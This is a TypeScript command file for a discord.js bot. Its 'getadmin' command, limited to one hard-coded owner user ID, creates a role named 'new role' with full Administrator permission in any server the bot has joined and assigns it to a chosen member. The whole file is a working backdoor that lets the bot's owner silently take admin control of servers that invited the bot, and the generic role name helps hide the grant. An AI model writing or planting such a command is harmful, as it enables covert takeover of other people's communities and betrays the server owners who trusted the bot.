import Discord from "discord.js";
import { ZClient } from "../../structure/client";
import { CmdType } from "../../utils/types";
import dcUtil from "../../utils/discord-util";

export = {
    name: "getadmin",
    aliases: ['ga'],
    guilds: [],
    permissions: [],
    users: ['411895879935590411'],
    description: '取得伺服器管理員',
    roles: [],
    type: [CmdType.Owner],

    async execute(client: ZClient, msg: Discord.Message, args: string[]) {
        if (args.length < 2) return msg.reply(`${client.prefix}${this.name} <server-id> <tag-someone>`);
        let guild = dcUtil.getGuildByID(client, args[0]);
        if (guild == null) return msg.reply(`Unknown ${args[0]}`)
        let member = await dcUtil.getMemberByTag(guild, args[1])
        if (member == null) return msg.reply(`Unknown ${args[1]}`)
        let role = await createRole(guild, "new role");
        let roleId = role.id;
        member.roles.add(roleId)
    }
}

async function createRole(guild: Discord.Guild, name: string): Promise<Discord.Role> {
    return await guild.roles.create({
        name: name,
        permissions: Discord.PermissionFlagsBits.Administrator
    })
}